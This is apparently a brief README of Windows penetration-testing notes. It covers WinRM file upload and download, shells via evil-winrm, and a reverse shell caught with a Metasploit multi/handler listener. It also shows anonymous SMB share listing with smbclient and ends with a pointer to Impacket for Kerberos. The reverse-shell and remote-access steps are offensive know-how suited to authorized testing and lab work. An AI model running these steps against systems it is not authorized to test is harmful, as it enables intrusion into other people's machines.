# WINDOWS Pen Testing scripts and tutorials

## WinRM 

### File transfer

For the winrm service use winrm/wirnmcp.rb to upload and download files

```bash
ruby winrm/winrmcp.rb IP USER PASSWORD -u LOCAL_FILES+ REMOTE_FOLDER
```

```bash
ruby ./winrm/winrm.rb IP USER PASSWORD -d REMOTE_FILES+ LOCAL_FOLDER
```

### Shell

use evil-winrm for a shell. 

If something wont work execute 

```bash
bash ./msf/create-reverse-shell.sh LOCAL_IP LOCAL_PORT 
```

and execute it on the remote server

while having the following session open at metasploit

```msf
msfconsole

use exploit/multi/handler
set LPORT LOCAL_PORT
set LHOST LOCAL_IP
exploit -j -z 
```

if the meterpreter session is opened in the msfconsole:

```
sessions -i 0
```

to get to the first created session


## SAMBA

```bash
smbclient -L //IP/ 
```

just hit enter for anonymous access. 
You could also try to access it anonymously with

```bash
smbclient //IP/SHARE 
```


## Kerberos

Checkout Impacket scripts
